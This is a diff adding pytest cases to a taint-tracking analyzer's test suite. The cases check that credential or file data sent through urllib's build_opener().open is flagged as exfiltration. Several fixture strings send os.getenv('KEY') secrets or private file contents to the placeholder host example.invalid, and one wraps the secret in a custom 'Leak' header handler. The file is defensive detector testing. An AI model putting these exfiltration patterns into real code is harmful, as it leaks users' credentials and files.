@@ -20,6 +20,8 @@ from __future__ import annotations
 import json
 import time
 
+import pytest
+
 from skillspector.nodes.analyzers import behavioral_taint_tracking
 from skillspector.nodes.analyzers.common import build_type_map
 from skillspector.nodes.deduplicate import deduplicate
@@ -123,6 +125,199 @@ class TestCredentialExfiltration:
         findings = _run(code)
         tt3 = [f for f in findings if f.rule_id == "TT3"]
         assert len(tt3) >= 1
+
+
+# ── Inline urllib opener network sinks ────────────────────────────────
+
+
+class TestInlineUrllibOpener:
+    """Inline and stored urllib openers follow existing name-based sink policy."""
+
+    @pytest.mark.parametrize(
+        ("imports", "factory"),
+        [
+            ("import urllib.request", "urllib.request.build_opener"),
+            ("import urllib.request as ur", "ur.build_opener"),
+            ("from urllib import request as ur", "ur.build_opener"),
+            ("from urllib.request import build_opener as make", "make"),
+        ],
+    )
+    @pytest.mark.parametrize("payload", ["request", "direct", "variable"])
+    def test_credential_to_inline_opener(self, imports, factory, payload):
+        prefix = f"import os\n{imports}\n"
+        if payload == "request":
+            # .get() isolates the missing sink from the separate nested-subscript gap.
+            prefix += (
+                "import urllib.request\n"
+                'req = urllib.request.Request("https://example.invalid", '
+                'headers={"Authorization": "Bearer " + os.environ.get("KEY")})\n'
+            )
+            args = "req"
+        elif payload == "direct":
+            args = '"https://example.invalid", data=os.getenv("KEY")'
+        else:
+            prefix += 'secret = os.environ["KEY"]\n'
+            args = '"https://example.invalid", data=secret'
+        findings = _run(prefix + f"{factory}().open({args})\n")
+        tt3 = [f for f in findings if f.rule_id == "TT3"]
+        assert len(tt3) == 1
+        assert tt3[0].severity == "CRITICAL"
+        assert tt3[0].file == "script.py"
+        assert tt3[0].start_line == len(prefix.splitlines()) + 1
+        assert "build_opener.open" in tt3[0].message
+        assert f"{factory}().open" in tt3[0].matched_text
+
+    def test_handler_arguments_keep_the_network_sink(self):
+        code = (
+            "import os, urllib.request\n"
+            "class NoRedirect(urllib.request.HTTPRedirectHandler):\n"
+            "    def redirect_request(self, *args):\n"
+            "        return None\n"
+            "urllib.request.build_opener(NoRedirect()).open(\n"
+            '    "https://example.invalid", data=os.getenv("KEY"))\n'
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    def test_file_data_to_inline_opener_is_tt4(self):
+        code = (
+            "import urllib.request\n"
+            'data = open("private.txt").read()\n'
+            'urllib.request.build_opener().open("https://example.invalid", data=data)\n'
+        )
+        assert "TT4" in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize(
+        "call",
+        [
+            'urllib.request.build_opener().open("https://example.invalid")',
+            'urllib.request.build_opener().open("https://example.invalid", data=b"public")',
+            'urllib.request.build_opener().close(os.getenv("KEY"))',
+            'open("local.txt", "w").write(os.getenv("KEY"))',
+            'Fake().open(os.getenv("KEY"))',
+        ],
+    )
+    def test_other_open_methods_and_public_payloads_are_not_tt3(self, call):
+        code = "import os, urllib.request\n" + call + "\n"
+        assert "TT3" not in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize("stored", [False, True])
+    @pytest.mark.parametrize(
+        ("imports", "factory"),
+        [
+            ("import urllib.request", "urllib.request.build_opener"),
+            ("import urllib.request as ur", "ur.build_opener"),
+            ("from urllib import request as ur", "ur.build_opener"),
+            ("from urllib.request import build_opener as make", "make"),
+        ],
+    )
+    def test_stored_and_inline_opener_aliases(self, imports, factory, stored):
+        prefix = f"import os\n{imports}\n"
+        if stored:
+            prefix += f"opener = {factory}()\n"
+            call = "opener.open"
+        else:
+            call = f"{factory}().open"
+        assert "TT3" in _rule_ids(_run(prefix + f'{call}(os.getenv("KEY"))\n'))
+
+    @pytest.mark.parametrize(
+        "code",
+        [
+            'import os\ndef send():\n    import urllib.request\n    urllib.request.build_opener().open(os.getenv("KEY"))\n',
+            'import os, urllib.request\ndef helper():\n    import urllib.parse\nurllib.request.build_opener().open(os.getenv("KEY"))\n',
+            'import os\nfrom urllib import request\ndef handle(request):\n    pass\nrequest.build_opener().open(os.getenv("KEY"))\n',
+            'import os\nif __name__ == "__main__":\n    import urllib.request\n    urllib.request.build_opener().open(os.getenv("KEY"))\n',
+            'import os, urllib.request\nurllib.request.HTTPRedirectHandler.max_repeats = 2\nurllib.request.build_opener().open(os.getenv("KEY"))\n',
+            'import os, urllib.request\ndef unused(urllib=None):\n    pass\nurllib.request.build_opener().open(os.getenv("KEY"))\n',
+            'import os\ndef send():\n    urllib.request.build_opener().open(os.getenv("KEY"))\nimport urllib.request\n',
+        ],
+    )
+    def test_ordinary_import_layouts_do_not_disable_sink(self, code):
+        assert "TT3" in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize("stored", [False, True])
+    @pytest.mark.parametrize(
+        ("payload", "rule"),
+        [
+            ('data=os.getenv("KEY")', "TT3"),
+            ('data=open("private.txt").read()', "TT4"),
+            ('data=b"public"', None),
+        ],
+    )
+    def test_inline_and_stored_payloads_agree(self, stored, payload, rule):
+        code = "import os, urllib.request\n"
+        if stored:
+            code += "opener = urllib.request.build_opener()\n"
+            call = "opener.open"
+        else:
+            call = "urllib.request.build_opener().open"
+        findings = _run(code + f'{call}("https://example.invalid", {payload})\n')
+        if rule:
+            assert rule in _rule_ids(findings)
+        else:
+            assert not {"TT3", "TT4"} & _rule_ids(findings)
+
+    def test_unrelated_stored_factory_is_not_a_network_sink(self):
+        assert "TT3" not in _rule_ids(
+            _run('import os\nopener = Fake()\nopener.open(os.getenv("KEY"))\n')
+        )
+
+    @pytest.mark.parametrize(
+        "prefix",
+        [
+            "def build_opener():\n    return Fake()\n",
+            "from other_module import build_opener\n",
+        ],
+    )
+    def test_unrelated_factory_is_not_a_network_sink(self, prefix):
+        assert "TT3" not in _rule_ids(
+            _run("import os\n" + prefix + 'build_opener().open(os.getenv("KEY"))\n')
+        )
+
+    def test_same_line_occurrences_keep_separate_locations(self):
+        call = 'urllib.request.build_opener().open("https://example.invalid", data=secret)'
+        code = 'import os, urllib.request\nsecret = os.getenv("KEY")\n' + f"{call}; {call}\n"
+        findings = [f for f in _run(code) if f.rule_id == "TT3"]
+        assert len(findings) == 2
+        assert len({f.start_column for f in findings}) == 2
+
+    def test_direct_urlopen_control_still_reports_request_payload(self):
+        code = (
+            "import os, urllib.request\n"
+            'req = urllib.request.Request("https://example.invalid", '
+            'headers={"Authorization": os.getenv("KEY")})\n'
+            "urllib.request.urlopen(req)\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
+
+    @pytest.mark.parametrize("stored", [False, True])
+    @pytest.mark.parametrize("credential", ["os.getenv('KEY')", "secret"])
+    def test_handler_credentials_follow_existing_sink_policy(self, credential, stored):
+        code = (
+            "import os, urllib.request\n"
+            "class Leak(urllib.request.BaseHandler):\n"
+            "    def __init__(self, value):\n"
+            "        self.value = value\n"
+            "    def http_request(self, req):\n"
+            "        req.add_header('Authorization', self.value)\n"
+            "        return req\n"
+            "secret = os.getenv('KEY')\n"
+        )
+        factory = f"urllib.request.build_opener(Leak({credential}))"
+        if stored:
+            code += f"opener = {factory}\n"
+            call = "opener.open"
+        else:
+            call = f"{factory}.open"
+        assert "TT3" in _rule_ids(_run(code + f"{call}('https://example.invalid')\n"))
+
+    def test_keyword_request_argument_is_checked(self):
+        code = (
+            "import os, urllib.request\n"
+            'req = urllib.request.Request("https://example.invalid", '
+            'headers={"Authorization": os.getenv("KEY")})\n'
+            "urllib.request.build_opener().open(fullurl=req)\n"
+        )
+        assert "TT3" in _rule_ids(_run(code))
 
 
 # ── TT4: File read → network sink ──────────────────────────────────────
